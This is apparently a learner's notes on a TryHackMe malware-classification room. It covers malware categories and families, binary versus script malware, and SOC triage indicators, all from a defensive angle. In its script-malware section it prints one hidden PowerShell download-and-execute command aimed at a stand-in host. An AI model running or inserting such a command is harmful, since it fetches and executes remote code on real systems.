# 🦠 Malware Classification — TryHackMe

## 📅 Day 115 - 365 Days of Cybersecurity

## ✅ Status: Completed

---

# 🧠 Overview

In this room, I learned how to **classify malware by behavior, objectives, and delivery methods**, which is a critical skill for threat detection and incident response.

Rather than analyzing specific malware samples in depth, this room focused on understanding:

* Common malware categories
* Malware families and their behavior
* Binary vs script-based malware
* Indicators useful for SOC triage and detection

📌 Key concept:

**Correct malware classification helps determine response priorities and investigative direction.** ([Medium][1])

---

# 🎯 Learning Objectives

* Identify major malware categories
* Understand malware behavior and objectives
* Differentiate malware families
* Distinguish binary vs script-based malware
* Recognize common indicators used in malware detection

---

# 🧬 Malware Categories

## 🔹 Adware

Purpose:

* Display unwanted advertisements
* Generate revenue for attackers

Indicators:

* Pop-ups
* Browser hijacking
* Suspicious background processes

---

## 🔹 Spyware

Purpose:

* Monitor victims silently
* Steal sensitive information

Common behaviors:

* Credential theft
* Keystroke monitoring
* Screenshot capture

Example:

* Pegasus

MITRE:

* Collection
* Exfiltration

---

## 🔐 Ransomware

Purpose:

* Encrypt files
* Demand payment

Indicators:

* Mass file modifications
* Ransom notes
* Abnormal encryption activity

Example:

* Akira

---

## 💣 Wiper Malware

Purpose:

* Destroy data permanently

Behavior:

* Overwrites data
* Causes operational disruption

Example:

* Shamoon

📌 Difference:

* Ransomware wants payment
* Wipers aim for destruction

---

## 📤 Data Stealers

Purpose:

* Exfiltrate sensitive data

Targets:

* Credentials
* Browser data
* Files

Example:

* Agent Tesla
* RedLine

---

## ⌨️ Keyloggers

Purpose:

* Capture user input

Indicators:

* Credential theft
* Banking fraud
* Persistent monitoring

---

## 🎛️ C2 / RAT Malware

Purpose:

* Remote attacker control

Capabilities:

* Command execution
* Lateral movement
* Additional payload delivery

Example:

* QakBot

---

## ⛏️ Cryptominers

Purpose:

* Hijack system resources for mining

Indicators:

* High CPU usage
* Unusual processes
* Performance degradation

---

# 🧪 Malware Families

## 📌 Key Concept

Malware families:

* Share codebase
* Share behavior
* Often evolve into variants

Why this matters:

Classifying by family helps:

* Improve detections
* Track threat actors
* Apply known response playbooks

---

## Example Families Studied

* Pegasus (Spyware)
* Akira (Ransomware)
* Shamoon (Wiper)
* Agent Tesla (Stealer)
* RedLine (Keylogger / Stealer)
* QakBot (RAT / Loader)

([Medium][1])

---

# ⚙️ Binary vs Script-Based Malware

---

## 🔹 Binary Malware

Examples:

* `.exe`
* `.dll`

Characteristics:

* Compiled executables
* Stable signatures
* Byte patterns detectable by AV

### Detection Indicators

* Hashes
* File signatures
* Imports / strings
* Static artifacts

Example:

```bash id="b1k2t7"
md5sum sample.exe
```

---

## 🔹 Script-Based Malware

Examples:

* `.ps1`
* `.bat`
* `.js`
* `.vbs`

Characteristics:

* Easy to modify
* Common for initial access
* Often fileless or in-memory

---

## Example Malicious PowerShell

```powershell id="r8v4tx"
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
```

Indicators:

* Encoded commands
* Hidden PowerShell
* Download-and-execute behavior

---

## 📌 Key Difference

Binary malware:

* Easier signature detection

Script malware:

* More flexible and often stealthier

---

# 🔎 Malware Detection Clues

Common suspicious behaviors:

* Unexpected outbound connections
* Encoded PowerShell
* Payload downloads
* Credential harvesting
* Persistence behavior
* Resource abuse (cryptominers)

📌 In SOC:
Behavior often matters more than file names.

---

# 🧱 Obfuscation Awareness

Attackers often hide malicious intent through:

* Base64 encoding
* Obfuscation
* In-memory execution

Goal:

* Evade detection
* Avoid writing files to disk

---

# 🚨 Indicators of Compromise (IoCs)

* Suspicious PowerShell usage
* High CPU anomalies
* File encryption behavior
* Unknown external connections
* Data exfiltration activity
* Encoded or obfuscated scripts
* Unexpected child processes

---

# 🛡️ SOC Classification Approach

## Triage Questions

When analyzing suspected malware:

1. What does it do?
2. What objective does it have?
3. How is it delivered?
4. Is it binary or script-based?
5. Does it map to a known malware family?

---

## Classification Supports

* Alert triage
* Prioritization
* Response decisions
* Threat hunting
* Incident escalation

---

# 🛠️ Concepts & Tools Covered

* Hashing (MD5 concepts)
* Static indicators
* Behavioral indicators
* Malware family concepts
* Script abuse patterns
* MITRE ATT&CK mapping

---

# 🧠 Key Takeaways

* Malware classification is foundational for SOC work
* Behavior matters more than names
* Binary and script-based malware require different detection approaches
* Malware families help improve detection and response
* Classification supports faster and more accurate triage

---

# 📌 Final Thoughts

This room helped me:

* Build a foundation in malware categorization
* Understand malware behavior from a defender’s perspective
* Differentiate common malware families
* Recognize indicators useful in detection workflows
* Strengthen my SOC triage and threat analysis mindset

